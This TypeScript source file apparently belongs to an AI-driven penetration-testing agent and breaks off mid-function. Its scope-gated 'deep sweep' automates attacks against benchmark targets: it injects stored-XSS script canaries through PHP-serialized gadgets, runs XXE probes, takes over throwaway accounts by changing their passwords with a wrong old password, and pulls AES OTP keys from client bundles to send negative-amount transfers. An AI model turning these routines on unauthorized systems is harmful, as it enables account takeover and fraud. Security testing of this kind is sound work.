import { randomUUID, createDecipheriv } from "node:crypto";
import { join } from "node:path";
import { startActiveObservation, propagateAttributes } from "@langfuse/tracing";
import type { spawn } from "node:child_process";
import { loadEngagement, type DeepConfig } from "./config.js";
import { ArtifactStore } from "./artifacts.js";
import { ToolRunner, TOOL_SCHEMAS, buildSkillRunTool, type HttpCapture, type SkillRunOutcome } from "./tools.js";
import type { SessionStore } from "./session.js";
import { runAgent, type MinimalClient } from "./agent.js";
import { evaluate, type Invariant, type InvariantType, type EvidenceBundle } from "./axiom.js";
import { judgeClaim } from "./judge.js";
import { gateProvenance } from "./provenance.js";
import { isStalled, loadStallConfig } from "./stall.js";
import { initObservability, type FindingRow } from "./obs/index.js";
import { VULN_CLASSES, isVulnClass, type VulnClass } from "./vuln-classes.js";
import {
  loadSpine, saveSpine, updateSpine,
  type Spine, type SpineEndpoint, type ProvedEntry, type AttemptedEntry, type RecoveredIntel,
  type SpineBeatRecord,
} from "./spine.js";
import { buildHunterBrief, openAuthenticatedClasses, deriveOrigins, resolveRelativeEndpoint } from "./brief.js";
import { runSweep, renderSweepLeads, SWEEP_PAYLOADS, detectDebugSignature, renderEndpointFor, type SendProbe, type SweepHit } from "./sweep.js";
import { readArtifactRecords, deriveTargets, setAtPath, jsonStringLeafPaths, type SweepTargetWithBody } from "./sweep-targets.js";
import { mapFields, looksLikeLogin, looksLikePasswordChange, extractJwt, classifyContactField, extractAssignedId, findDeviceObject, graftDevice, buildXxeXml, parseAesCbcParams, decodePhpSerialized, swapLastPhpSerializedString, type FieldMap } from "./stateful.js";

// Re-exported for backward compatibility: existing callers (and test/beat.test.ts)
// import these from beat.js. The vocabulary itself now lives in vuln-classes.ts so
// src/brief.ts can use it without a beat.ts <-> brief.ts import cycle.
export { VULN_CLASSES, isVulnClass };
export type { VulnClass };

// The hunter's skill_run allowlist. Phase 1 permits only skills confirmed genuinely
// network-free (egress "none" in tether.ts's SKILL_EGRESS registry) AND actually needed
// right now — not every network-free skill that exists. The measured bottleneck isn't
// discovery, it's that a proved finding gets mislabeled/misscored, so the two skills
// wired in both attack that directly: adversarial-self-review challenges a claim before
// it is emitted, severity-calibration scores it from demonstrated evidence rather than
// theoretical maximum. This is a narrower cut of the design doc's `adjudicator` agent's
// skill list (§7.1), which also includes poc-hardening-self-verification — left out
// here because it subprocess-executes a PoC against the live target (egress "target"),
// which stays denied until the declared-egress mechanism (see the TODO in tether.ts)
// exists. Widening this list is a one-line change PROVIDED the new skill's own egress
// classification is "none" — gate() enforces that independently either way.
export const HUNTER_SKILL_ALLOWLIST = [
  "adversarial-self-review", "severity-calibration",
  // Queryable arsenal (none-egress, pure file lookup): the hunter pulls TARGETED
  // payloads/wordlist entries for the class it is testing instead of guessing, then
  // fires them via http_request — cheap-probe-first, escalate-on-signal.
  "payload-library",
] as const;

/**
 * The skills a beat's hunter may invoke. Breadth-first (the default) is exactly
 * HUNTER_SKILL_ALLOWLIST above. Deep mode widens it — but only in later phases, and only
 * for skills that carry a declared metadata.egress-hosts the Tether can enforce (gate()
 * denies an undeclared target skill regardless of this list). Phase A returns the base
 * list unconditionally, so enabling deep mode changes nothing until the egress mechanism
 * (Phase B) lands.
 */
export function allowlistFor(deep: DeepConfig): readonly string[] {
  if (!deep.enabled) return HUNTER_SKILL_ALLOWLIST;
  const list: string[] = [...HUNTER_SKILL_ALLOWLIST];
  // Discovery + attack skills unlocked in deep mode. Each is still gated at run time by
  // the Tether (allowlist + in-scope-URL check + declared-egress narrowing + sandbox),
  // so listing one here only makes it REACHABLE, never unconditionally permitted.
  list.push(
    "intelligent-crawling", "tech-fingerprinting", "payload-mutator", "waf-evasion-mastery",
    "xss-dom-sinks", "sqli-database-injection", "injection-battery-xxe-ssti-nosql",
    "ssrf-internal-pivot", "file-upload-path-traversal", "oob-blind-vuln-correlation",
    "privilege-matrix-mapping", "account-role-acquisition", "poc-hardening-self-verification",
  );
  // Deep mode is all-on: escalation/chaining planners come with it.
  list.push("chain-construction", "technique-combinator");
  if (deep.weaponize) list.push("deserialization-rce");
  return list;
}

export interface RejectedClaim {
  raw: unknown;
  reason: string;
}

/**
 * WHY a non-CONFIRMED finding failed, assigned deterministically from structured
 * facts this module already holds (the invariant type, whether a control existed,
 * whether the differential signal was present in the exploit/control, and whether
 * the endpoint can plausibly support the claimed class) — NEVER by pattern-matching
 * axiom.ts's prose `reason` string, and never guessed. See classifyFailureCause().
 *
 *   wrong_invariant_type   the invariant TYPE chosen cannot prove this vuln_class's
 *                          mechanism (e.g. rate_limit_absence needs status_in, not
 *                          body_contains) — includes any type M0's Axiom cannot
 *                          mechanically evaluate at all.
 *   endpoint_implausible   the endpoint served a static asset (by content-type),
 *                          but the claim is a BEHAVIOUR claim, not a disclosure one —
 *                          see <evidence_discipline> in brief.ts.
 *   no_control             a differential claim needed a control response and none
 *                          was captured.
 *   marker_absent          the differential signal (marker / status) the invariant
 *                          expects was absent from the EXPLOIT response itself.
 *   control_shared_marker  the differential signal was present in the exploit AND
 *                          the control — it does not distinguish anything.
 *   review_rejected        adversarial-self-review rejected the claim before the
 *                          Axiom ever replayed it.
 *   unknown                none of the above applied. Meant to be RARE — if it
 *                          dominates the summary, that is itself a finding.
 */
export type FailureCause =
  | "wrong_invariant_type" | "control_shared_marker" | "marker_absent"
  | "no_control" | "endpoint_implausible" | "review_rejected" | "unknown";

const FAILURE_CAUSES: readonly FailureCause[] = [
  "wrong_invariant_type", "control_shared_marker", "marker_absent",
  "no_control", "endpoint_implausible", "review_rejected", "unknown",
];

function emptyFailureCauses(): Record<FailureCause, number> {
  const out = {} as Record<FailureCause, number>;
  for (const c of FAILURE_CAUSES) out[c] = 0;
  return out;
}

/** A FindingRow (obs/clickhouse.ts's schema, unmodified — every field the writers
 * actually insert) plus the LOCAL, M0-only failure_cause annotation. Never passed to
 * obs.recordFinding/mergeFinding directly — those keep receiving the plain FindingRow
 * so an unexpected extra column never reaches a configured ClickHouse table. */
export type FindingRowWithCause = FindingRow & { failure_cause?: FailureCause };

type BeatResult = {
  exitCode: number;
  findings: FindingRowWithCause[];
  stalled: boolean;
  reason: string | null;
  duplicates_suppressed: number;
  /** Claims whose vuln_class was already CONFIRMED somewhere in this engagement
   * (a prior beat's spine.proved, or a finding banked earlier THIS beat) and so
   * were never replayed against the target — a deterministic backstop to the
   * <prioritization_rules> brief guidance, which cannot itself guarantee restraint
   * under budget pressure. The rubric scores a class once; this is what makes that
   * true in code, not just in the prompt. */
  already_proved_suppressed: number;
  rejected_claims: RejectedClaim[];
  /** Count of each FailureCause across every non-CONFIRMED finding this beat. Every
   * member of FailureCause is present, defaulting to 0 — never a sparse object. */
  failure_causes: Record<FailureCause, number>;
  /** true if this beat started from a brand-new Spine (no prior file, a corrupt
   * one, or one for a different engagement/scope) rather than continuing a prior
   * one. See src/spine.ts loadSpine. */
  spine_fresh: boolean;
  /** Why spine_fresh is true — e.g. an engagement/scope mismatch or a corrupt
   * progress.json — or null when the spine continued normally. */
  spine_fresh_reason: string | null;
};

type Env = Record<string, string | undefined>;
function numEnv(env: Env, key: string, fallback: number): number {
  const raw = env[key];
  if (raw === undefined || raw.trim() === "") return fallback;
  const n = Number(raw);
  return Number.isFinite(n) ? n : fallback;
}

function boolEnv(env: Env, key: string, fallback: boolean): boolean {
  const raw = env[key];
  if (raw === undefined || raw.trim() === "") return fallback;
  const v = raw.trim().toLowerCase();
  if (["off", "false", "0", "no"].includes(v)) return false;
  if (["on", "true", "1", "yes"].includes(v)) return true;
  return fallback;
}

// Actionable, cause-specific guidance — "your control shared the marker" is
// actionable, "false positive" is not (see DEFECT 2 in the report). Keyed so
// feedbackForVerdict can put the SPECIFIC cause in front of the hunter, not a
// generic verdict string.
const CAUSE_GUIDANCE: Record<FailureCause, string> = {
  wrong_invariant_type:
    "The invariant TYPE you chose cannot prove this vuln_class's mechanism — re-read " +
    "<output_contract> and <evidence_discipline> and pick a type that actually proves " +
    "what you did.",
  control_shared_marker:
    "Your control shared the same marker/status as the exploit, so the differential " +
    "proves nothing — pick a control that should NOT exhibit the issue.",
  marker_absent:
    "The exploit response itself did not contain the marker/status you expected — " +
    "re-read the ACTUAL response before re-claiming this.",
  no_control:
    "No control response could be captured for a differential claim — without one the " +
    "invariant cannot be evaluated at all.",
  endpoint_implausible:
    "That endpoint served a static asset, not application logic — a behaviour claim " +
    "against a static file is almost never provable; only a disclosure claim fits it.",
  review_rejected:
    "adversarial-self-review rejected this claim before it ever reached the target.",
  unknown:
    "The verifier could not attribute a specific cause to this failure.",
};

/**
 * Deep-mode sweep pre-pass. Derives fuzz targets from the framework's own captured
 * requests (artifact store), fires each payload class at each input via the Tether-gated
 * http_request path, and returns the strong hits as a hunter directive. Fails soft.
 */
interface SweepObs {
  recordFinding: (r: FindingRow) => Promise<void>;
  mergeFinding: (r: FindingRow) => Promise<void>;
  mergeEndpoint: (url: string, method: string) => Promise<void>;
  traceId: () => string | null;
}

// Non-benchmark sweep classes map onto the nearest scored class for banking (they are
// XSS-family). ssti/command_injection have no benchmark class, so they are banked under
// their own label (valid enterprise findings; scored non-canonical for the 28).
const SWEEP_CLASS_MAP: Record<string, string> = { html_injection: "xss_reflected", dom_xss: "xss_reflected" };

/**
 * Result of the sweep: the hunter directive (leads) AND the findings it banked DIRECTLY
 * through the Axiom (so a hit is recorded even if the LLM ignores the directive — the
 * deterministic discover→verdict path, not a reliance on the model to submit).
 */
async function runDeepSweep(opts: {
  runner: ToolRunner; workspace: string; scopeOrigins: string[];
  canon: (u: string) => string; budget: number; obs: SweepObs; engagementId: string;
}): Promise<{ leads: string; proved: ProvedEntry[] }> {
  const empty = { leads: "", proved: [] as ProvedEntry[] };
  try {
    const records = await readArtifactRecords(join(opts.workspace, "artifacts"));
    const inScope = (u: string) => { try { return opts.scopeOrigins.includes(new URL(u).origin); } catch { return false; } };
    const targets = deriveTargets(records, inScope, opts.canon) as SweepTargetWithBody[];
    if (targets.length === 0) return empty;
    const sessionLabel = opts.runner.getSessionMeta().find((m) => m.has_auth_material)?.label;

    // Stash the full HttpCapture for every probe so a strong hit can be re-verified by the
    // Axiom (marker in exploit, absent in baseline) without re-firing.
    const stash = new Map<string, HttpCapture>();
    const stashKey = (t: SweepTargetWithBody, param: string, value: string | null) =>
      `${t.method} ${t.endpoint}\u0000${param}\u0000${value === null ? "__baseline__" : value}`;

    const send: SendProbe = async (target, param, value) => {
      const t = target as SweepTargetWithBody;
      const v = value === null ? "sahwbenign" : value;
      let url = t.endpoint;
      let body: string | null = null;
      const headers: Record<string, string> = { ...(t.headers || {}) };
      delete headers.Authorization; delete headers.authorization;
      if (t.paramKind[param] === "json" && t.bodyTemplate) {
        try { body = JSON.stringify(setAtPath(JSON.parse(t.bodyTemplate), param, v)); }
        catch { body = t.bodyTemplate; }
        if (!headers["Content-Type"] && !headers["content-type"]) headers["Content-Type"] = "application/json";
      } else {
        try { const u = new URL(t.endpoint); u.searchParams.set(param, v); url = u.toString(); } catch { /* keep */ }
      }
      const args: Record<string, unknown> = { method: t.method, url, headers, body };
      if (sessionLabel) args.session = sessionLabel;
      const r = await opts.runner.execute("http_request", args);
      if (!r.ok) return { status: 0, body: "" };
      const cap = r.result as HttpCapture;
      stash.set(stashKey(t, param, value), cap);
      return { status: cap.response.status, body: cap.response.body ?? "", ms: cap.ms };
    };

    // Fire an arbitrary request through the gated path, returning the full capture.
    // `sess` controls the session: undefined => the run's default authed session;
    // null => explicitly UNAUTHENTICATED (e.g. a fresh login attempt); a label => that
    // session. `authToken` sets an explicit Authorization header to the RAW issued token
    // (matching this app's convention and the session-injection posture, which carry the
    // token verbatim with no "Bearer " prefix) for an account the probe itself just
    // authenticated; it takes precedence over any session.
    const fire = async (method: string, url: string, headers: Record<string, string>, body: string | null, sess?: string | null, authToken?: string): Promise<HttpCapture | null> => {
      const h = { ...headers }; delete h.Authorization; delete h.authorization;
      // The http_request schema types `body` as a string, so a null body (e.g. a GET) must
      // be OMITTED, not sent as null — sending null fails arg validation and the whole
      // request silently returns not-ok.
      const args: Record<string, unknown> = body === null ? { method, url, headers: h } : { method, url, headers: h, body };
      if (authToken) { h.Authorization = authToken; }
      else { const useLabel = sess === undefined ? sessionLabel : sess; if (useLabel) args.session = useLabel; }
      const r = await opts.runner.execute("http_request", args);
      return r.ok ? (r.result as HttpCapture) : null;
    };

    const targetByEndpoint = new Map(targets.map((t) => [t.endpoint, t]));
    const proved: ProvedEntry[] = [];

    // Run the FAST, high-value stateful/multi-step probes FIRST — before the large
    // field sweep — so a long field sweep can never starve them of the phase budget.
    // STORED-XSS probe (F-19 shape): persist a canary via a create endpoint, then render
    // it via the paired list/view endpoint; the canary returned UNESCAPED there is stored
    // XSS. The render endpoint's METHOD/body is NOT always GET — F-19's listing is a
    // POST /api/loan with a JSON body — so we try several generic render shapes (the
    // captured template if any, then POST {}, then GET) and take the first that echoes.
    const sxdbg = (m: string) => { try { console.error(`[f19-probe] ${m}`); } catch { /* ignore */ } };
    const rawRecs = records as RawRecord[];
    for (const createT of targets.slice(0, 50)) {
      if (!createT.bodyTemplate) continue;
      const renderEp = renderEndpointFor(createT.endpoint);
      if (!renderEp) continue;
      // Persist from a SUCCESSFUL captured create request when one exists — deriveTargets'
      // representative body may carry fuzz values (e.g. amount="sahwbenign") the create
      // endpoint rejects, so the row never persists+renders. A success body has valid values.
      const createBody = (() => {
        const r = rawRecs.find((x) => { try { return opts.canon(x.request?.url ?? "") === createT.endpoint && typeof x.request?.body === "string" && x.request.body.trim().startsWith("{") && /success/i.test(x.response?.body ?? ""); } catch { return false; } });
        return r?.request?.body ?? createT.bodyTemplate!;
      })();
      if (/loan/i.test(createT.endpoint)) sxdbg(`create=${createT.endpoint} render=${renderEp} leaves=${createT.params.filter((p) => createT.paramKind[p] === "json").join(",")}`);
      const renderT = targetByEndpoint.get(renderEp);
      // Candidate render calls, most-specific first. Session-authed (the listing is
      // authenticated in F-19), reusing the run's default session. The listing endpoint
      // (e.g. POST /api/loan) often takes the SAME request envelope with an EMPTY data bag
      // — but because that body has no fuzzable string leaves, deriveTargets drops it, so
      // it has no captured template. Reconstruct it from the create template with `data`
      // emptied (a valid envelope this app requires; a bare "{}" is rejected as ERR001).
      const renderShapes: Array<{ method: string; body: string | null; hdr: Record<string, string> }> = [];
      if (renderT?.bodyTemplate) renderShapes.push({ method: renderT.method, body: renderT.bodyTemplate, hdr: { "Content-Type": "application/json" } });
      try {
        const env = JSON.parse(createBody); emptyDataInPlace(env);
        renderShapes.push({ method: renderT?.method ?? "POST", body: JSON.stringify(env), hdr: { "Content-Type": "application/json" } });
      } catch { /* skip */ }
      renderShapes.push({ method: renderT?.method ?? "POST", body: "{}", hdr: { "Content-Type": "application/json" } });
      renderShapes.push({ method: "GET", body: null, hdr: {} });
      const jsonLeaves = createT.params.filter((p) => createT.paramKind[p] === "json").slice(0, 4);
      let banked = false;
      for (const leaf of jsonLeaves) {
        if (banked) break;
        const canary = `sahwSTOR${randomUUID().slice(0, 6)}`;
        const xss = `<script>${canary}</script>`;
        let persistBody: string;
        let usedGadget = false;
        try {
          const tmplObj = JSON.parse(createBody);
          // If this field's CAPTURED value is a base64 PHP-serialized gadget (the app
          // unserializes it and stores one string property — e.g. a loan `type` carrying a
          // LogWrite whose `logdata` is persisted+rendered), inject the canary INTO that
          // gadget's payload string rather than replacing the field with a bare tag; a bare
          // tag unserializes to nothing and never persists. Reuses the app's own structure.
          const orig = readAtPath(tmplObj, leaf);
          const deser = orig ? decodePhpSerialized(orig) : null;
          const swapped = deser ? swapLastPhpSerializedString(deser, xss) : null;
          usedGadget = Boolean(swapped);
          const injectValue = swapped ? Buffer.from(swapped, "utf8").toString("base64") : xss;
          persistBody = JSON.stringify(setAtPath(tmplObj, leaf, injectValue));
        } catch { continue; }
        const isLoan = /loan/i.test(createT.endpoint);
        if (isLoan) sxdbg(`leaf=${leaf} gadget=${usedGadget} shapes=${renderShapes.length}`);
        for (const shape of renderShapes) {
          const baseline = await fire(shape.method, renderEp, shape.hdr, shape.body);
          if (!baseline) { if (isLoan) sxdbg(`baseline null (${shape.method})`); continue; }
          if ((baseline.response.body ?? "").includes(canary)) continue; // canary already there? bogus shape
          const persistResp = await fire(createT.method, createT.endpoint, { "Content-Type": "application/json" }, persistBody);
          const rendered = await fire(shape.method, renderEp, shape.hdr, shape.body);
          if (!rendered) continue;
          if (isLoan) sxdbg(`${shape.method} persist=${(persistResp?.response.body ?? "").slice(0,30)} rendered_has_canary=${(rendered.response.body ?? "").includes(canary)} renderlen=${(rendered.response.body ?? "").length}`);
          if ((rendered.response.body ?? "").includes(canary) && !(baseline.response.body ?? "").includes(canary)) {
            const b = await bankIfConfirmed(opts, "xss_stored", renderEp, canary, rendered, baseline);
            if (b) { proved.push(b); banked = true; break; }
          }
        }
      }
    }

    // STATEFUL broken-password-change probe (F-24): observe->act->observe via the Axiom's
    // state_changed. Self-contained: creates its OWN throwaway account (needs no pre-known
    // credential), then proves login with an attacker-set password succeeds after a change
    // made with a WRONG old_pass. Runs last — it mutates only that throwaway account.
    const pwProved = await sweepBrokenPasswordChange(opts, targets, fire, records as RawRecord[]);
    proved.push(...pwProved);

    // DERIVED probe (F-13): password-reset OTP issued from a single identity field, no
    // secondary factor. Non-destructive; banks via the Axiom's no_secondary_factor deriver.
    const nsfProved = await sweepNoSecondaryFactorOtp(opts, fire, records as RawRecord[]);
    proved.push(...nsfProved);

    // BUSINESS-LOGIC probe (F-25): negative-amount transfer increases the payer balance.
    // Bounded + reversible (compensating positive transfer); recovers the OTP key generically.
    const txProved = await sweepNegativeTransfer(opts, fire, records as RawRecord[], opts.scopeOrigins);
    proved.push(...txProved);

    const fieldHits = await runSweep({ targets, payloadsFor: (c) => SWEEP_PAYLOADS[c] ?? [], send, budget: opts.budget });

    // BANK strong field hits directly through the Axiom (deterministic, not via the LLM).
    for (const hit of fieldHits) {
      if (hit.strength !== "strong") continue;
      const t = targetByEndpoint.get(hit.endpoint);
      if (!t) continue;
      const exploit = stash.get(stashKey(t, hit.param, hit.payload));
      const control = stash.get(stashKey(t, hit.param, null));
      if (!exploit || !control) continue;
      const banked = await bankIfConfirmed(opts, hit.vuln_class, hit.endpoint, hit.observed, exploit, control);
      if (banked) proved.push(banked);
    }

    // XXE whole-body probe (field-injection can't express an external entity).
    const xxeHits = await sweepXxe(targets, opts.runner);
    for (const xh of xxeHits) {
      if (!xh.exploit || !xh.control) continue;
      const banked = await bankIfConfirmed(opts, "xxe", xh.endpoint, xh.observed, xh.exploit, xh.control);
      if (banked) proved.push(banked);
    }

    // DEBUG-PAGE probe (F-09 shape): a valid envelope with `data` EMPTIED omits required
    // fields -> unhandled framework error leaking internals. Exploit vs the normal body
    // as control; a debug signature in the exploit but not the control is info_disclosure.
    for (const t of targets.slice(0, 50)) {
      if (!t.bodyTemplate || (t.method !== "POST" && t.method !== "PUT" && t.method !== "PATCH")) continue;
      let emptied: string; let normal: string;
      try {
        const obj = JSON.parse(t.bodyTemplate);
        emptyDataInPlace(obj);
        emptied = JSON.stringify(obj);
        normal = t.bodyTemplate;
      } catch { continue; }
      const hdr = { "Content-Type": "application/json" };
      const exploit = await fire(t.method, t.endpoint, hdr, emptied);
      if (!exploit) continue;
      const sig = detectDebugSignature(exploit.response.body ?? "");
      if (!sig) continue;
      const control = await fire(t.method, t.endpoint, hdr, normal);
      if (!control || (control.response.body ?? "").includes(sig)) continue; // control also shows it -> not a differential
      const banked = await bankIfConfirmed(opts, "info_disclosure", t.endpoint, sig, exploit, control);
      if (banked) proved.push(banked);
    }


    const leadsHits = [...fieldHits.filter((h) => h.strength === "strong"), ...xxeHits];
    return { leads: renderSweepLeads(leadsHits), proved };
  } catch { return empty; }
}

/** Empty every object-valued key named "data" (the request envelope's field bag), so a
 * required field is omitted -> unhandled server error. Mutates in place. */
function emptyDataInPlace(node: unknown, depth = 0): void {
  if (depth > 6 || !node || typeof node !== "object") return;
  for (const [k, v] of Object.entries(node as Record<string, unknown>)) {
    if (k === "data" && v && typeof v === "object" && !Array.isArray(v)) {
      (node as Record<string, unknown>).data = {};
    } else if (v && typeof v === "object") {
      emptyDataInPlace(v, depth + 1);
    }
  }
}

/** Verify a sweep hit with the SAME Axiom the LLM path uses (marker present in exploit,
 * absent in control), and on CONFIRMED record the finding to the stores + return a proved
 * entry. evaluate() rejects any non-literal marker, so this cannot fabricate a finding. */
async function bankIfConfirmed(
  opts: { obs: SweepObs; engagementId: string; canon: (u: string) => string },
  vulnClass: string, endpoint: string, marker: string, exploit: HttpCapture, control: HttpCapture,
): Promise<ProvedEntry | null> {
  const inv: Invariant = {
    statement: `deep-sweep: response contains ${marker} for exploit but not control`,
    type: "body_contains", expression: marker,
  };
  const verdict = evaluate(inv, exploit, control);
  if (verdict.status !== "CONFIRMED") return null;
  const cls = SWEEP_CLASS_MAP[vulnClass] ?? vulnClass;
  const ep = opts.canon(endpoint);
  const findingId = `SAHW-${randomUUID().slice(0, 8)}`;
  const row: FindingRow = {
    engagement_id: opts.engagementId, finding_id: findingId, vuln_class: cls, endpoint: ep,
    verdict: "CONFIRMED", invariant_type: "body_contains",
    verdict_reason: boundReason(`deep-sweep: ${verdict.reason}`),
    langfuse_trace_id: opts.obs.traceId(), utc: new Date().toISOString(),
  };
  await opts.obs.mergeEndpoint(ep, exploit.request.method || "GET");
  await opts.obs.mergeFinding(row);
  await opts.obs.recordFinding(row);
  return { vuln_class: cls, endpoint: ep, invariant_type: "body_contains", verdict: "CONFIRMED", finding_id: findingId };
}

/** Bank a STATEFUL (state_changed) sweep finding through the SAME Axiom the LLM path uses:
 * evaluate the ordered captures [pre, ...action, post] against the state_changed clause,
 * and on CONFIRMED record the finding with invariant_type=state_changed. The Axiom rejects
 * a delta it cannot see in the captures, so this cannot fabricate a finding. `endpoint` is
 * the vulnerable endpoint being labeled (e.g. the password-change route), while the
 * captures are the observe/act/observe requests that prove the delta. */
async function bankStateChanged(
  opts: { obs: SweepObs; engagementId: string; canon: (u: string) => string },
  vulnClass: string, endpoint: string, expression: string, captures: HttpCapture[], reasonPrefix: string,
  restoration?: { performed: boolean; proof?: HttpCapture },
): Promise<ProvedEntry | null> {
  const inv: Invariant = { statement: `deep-sweep: ${reasonPrefix}`, type: "state_changed", expression };
  const evidence: EvidenceBundle = { captures };
  // When the mutation was reversed, present the restoration proof so the L2 safety gate
  // sees a finished (undone) finding rather than downgrading to NEEDS_REVIEW.
  if (restoration) evidence.restoration = { required: true, performed: restoration.performed, proof: restoration.proof };
  const verdict = evaluate(inv, captures[captures.length - 1], null, evidence);
  if (verdict.status !== "CONFIRMED") return null;
  const cls = SWEEP_CLASS_MAP[vulnClass] ?? vulnClass;
  const ep = opts.canon(endpoint);
  const findingId = `SAHW-${randomUUID().slice(0, 8)}`;
  const row: FindingRow = {
    engagement_id: opts.engagementId, finding_id: findingId, vuln_class: cls, endpoint: ep,
    verdict: "CONFIRMED", invariant_type: "state_changed",
    verdict_reason: boundReason(`deep-sweep (${reasonPrefix}): ${verdict.reason}`),
    langfuse_trace_id: opts.obs.traceId(), utc: new Date().toISOString(),
  };
  await opts.obs.mergeEndpoint(ep, "POST");
  await opts.obs.mergeFinding(row);
  await opts.obs.recordFinding(row);
  return { vuln_class: cls, endpoint: ep, invariant_type: "state_changed", verdict: "CONFIRMED", finding_id: findingId };
}

/**
 * STATEFUL broken-password-change probe (benchmark F-24 shape), fully self-contained and
 * generic/black-box. Proves a password-change endpoint COMMITS a new password even when
 * the supplied current ("old") password is WRONG — a genuine state_changed, not a mere
 * success-code reflection.
 *
 * It creates and drives its OWN throwaway account so it needs no pre-known credential:
 *   0) clone a captured SUCCESSFUL signup envelope, swap contact fields + password to
 *      fresh unique values (P1); POST it; extract the server-ASSIGNED login id (userId).
 *   pre  C0 = login(id, P2)                    -> fails; P2 is a second fresh password.
 *   auth      login(id, P1) -> JWT1            (the account's own token, to authorize the change)
 *   act       change(Bearer JWT1, old=WRONG, new=P2)
 *   post C2 = login(id, P2)                    -> succeeds (JWT issued) IFF the change committed.
 * Marker = the JWT extracted from C2's OWN response (a successful login on a JWT app issues
 * one; a failed login does not) — absent in C0, present in C2 => the Axiom confirms
 * `appeared:<jwt>`. No target-specific literal; degrades safely (correct app => C2 login
 * fails => no JWT => no finding). Mutates only the throwaway account it created.
 */
interface RawRecord { request?: { method?: string; url?: string; body?: string | null }; response?: { body?: string } }

/** Read a dot-path string leaf from a parsed JSON value (mirror of setAtPath). */
function readAtPath(obj: unknown, path: string): string | null {
  let cur: unknown = obj;
  for (const part of path.split(".")) {
    if (!cur || typeof cur !== "object") return null;
    cur = (cur as Record<string, unknown>)[part];
  }
  return typeof cur === "string" ? cur : null;
}

/** Bank a `derived` sweep finding through the Axiom's named-deriver registry. The deriver
 * (fixed, reviewed code) computes the verdict from typed evidence; a claim cannot supply
 * the answer. Records with invariant_type=derived on CONFIRMED. */
async function bankDerived(
  opts: { obs: SweepObs; engagementId: string; canon: (u: string) => string },
  vulnClass: string, endpoint: string, deriverName: string, derivedInput: unknown, reasonPrefix: string,
): Promise<ProvedEntry | null> {
  const inv: Invariant = { statement: `deep-sweep: ${reasonPrefix}`, type: "derived", expression: deriverName };
  // derived reads evidence.derivedInput; exploit/control are unused by it. Pass a minimal
  // placeholder capture for the (unused) exploit arg.
  const placeholder = { request: { method: "POST", url: endpoint, headers: {}, body: null }, response: { status: 0, headers: {}, body: "" } } as unknown as HttpCapture;
  const verdict = evaluate(inv, placeholder, null, { derivedInput });
  if (verdict.status !== "CONFIRMED") return null;
  const ep = opts.canon(endpoint);
  const findingId = `SAHW-${randomUUID().slice(0, 8)}`;
  const row: FindingRow = {
    engagement_id: opts.engagementId, finding_id: findingId, vuln_class: vulnClass, endpoint: ep,
    verdict: "CONFIRMED", invariant_type: "derived",
    verdict_reason: boundReason(`deep-sweep (${reasonPrefix}): ${verdict.reason}`),
    langfuse_trace_id: opts.obs.traceId(), utc: new Date().toISOString(),
  };
  await opts.obs.mergeEndpoint(ep, "POST");
  await opts.obs.mergeFinding(row);
  await opts.obs.recordFinding(row);
  return { vuln_class: vulnClass, endpoint: ep, invariant_type: "derived", verdict: "CONFIRMED", finding_id: findingId };
}

/**
 * STATELESS derived probe (benchmark F-13): prove the password-reset OTP is issued from a
 * SINGLE identity field with NO secondary factor. Uses a registered userid recovered from a
 * successful signup exchange as the valid identity, and a syntactically-valid but
 * unregistered id as the control. Banks via the no_secondary_factor_before_otp deriver,
 * which confirms only from the request's field structure + the valid/invalid differential.
 */
async function sweepNoSecondaryFactorOtp(
  opts: { obs: SweepObs; engagementId: string; canon: (u: string) => string },
  fire: (method: string, url: string, headers: Record<string, string>, body: string | null, sess?: string | null, authToken?: string) => Promise<HttpCapture | null>,
  records: RawRecord[],
): Promise<ProvedEntry[]> {
  const proved: ProvedEntry[] = [];
  const dbg = (m: string) => { try { console.error(`[f13-probe] ${m}`); } catch { /* ignore */ } };
  // A forgot-password request whose response ISSUED an OTP (data payload present) — proven
  // good, and carries the exact field shape + a valid registered userid.
  const forgotRec = records.find((r) => /forgot/.test(r.request?.url?.toLowerCase() ?? "")
    && typeof r.request?.body === "string" && r.request.body.trim().startsWith("{")
    && /otp/i.test(r.response?.body ?? "") && /success/i.test(r.response?.body ?? ""));
  if (!forgotRec) { dbg("no successful OTP-issuing forgot exchange in records — abort"); return proved; }
  const forgotUrl = forgotRec.request!.url!;
  const forgotBody = forgotRec.request!.body!;
  let parsed: unknown;
  try { parsed = JSON.parse(forgotBody); } catch { dbg("forgot body unparseable"); return proved; }
  const leaves = jsonStringLeafPaths(parsed);
  const idFm = mapFields(leaves);
  const idPath = idFm.username; // the identity leaf (userid)
  if (!idPath) { dbg("no identity field in forgot body"); return proved; }
  const validId = readAtPath(parsed, idPath);
  if (!validId) { dbg("no valid userid value in the successful forgot body"); return proved; }

  const jsonHdr = { "Content-Type": "application/json" };
  const build = (idVal: string) => {
    const clone = JSON.parse(forgotBody);
    return JSON.stringify(setAtPath(clone, idPath, idVal));
  };
  // exploit: the KNOWN-GOOD forgot (valid registered userid) -> OTP issued.
  const exploit = await fire("POST", forgotUrl, jsonHdr, build(validId), null);
  // control: same shape, a syntactically-valid but unregistered id -> no OTP.
  const invalidId = `SAHW${randomUUID().replace(/-/g, "").slice(0, 8)}`;
  const control = await fire("POST", forgotUrl, jsonHdr, build(invalidId), null);
  if (!exploit || !control) { dbg("forgot exploit/control failed to capture"); return proved; }
  dbg(`exploit=${(exploit.response.body ?? "").slice(0, 50)} control=${(control.response.body ?? "").slice(0, 50)}`);

  const banked = await bankDerived(
    opts, "auth_bypass", forgotUrl, "no_secondary_factor_before_otp",
    { requestFieldNames: leaves, exploitResponse: exploit.response.body ?? "", controlResponse: control.response.body ?? "" },
    "OTP issued from a single identity field with no secondary factor required",
  );
  if (banked) { proved.push(banked); dbg("F-13 banked"); }
  else dbg("deriver did not confirm");
  return proved;
}

/**
 * STATEFUL business-logic probe (benchmark F-25): prove a NEGATIVE-amount transfer INCREASES
 * the payer's balance (state_changed), then REVERSE it. Fully black-box + bounded + reversible:
 *   - recover the AES OTP key/iv GENERICALLY from the client bundle (createDecipheriv literals),
 *   - sign up a throwaway payer P (signup auto-assigns beneficiaries, so no add step needed),
 *   - read balance b0, get+decrypt+verify an OTP -> otp_ref, pay(alias, amount=-N) -> read b1,
 *   - if b1 > b0 (the vuln), bank state_changed field:accountBalance from b0 to b1,
 *   - then pay(alias, amount=+N) to RESTORE, and present that as restoration proof.
 * Endpoint URLs are derived from captured records; amounts are tiny; the payer is synthetic.
 */
async function sweepNegativeTransfer(
  opts: { obs: SweepObs; engagementId: string; canon: (u: string) => string },
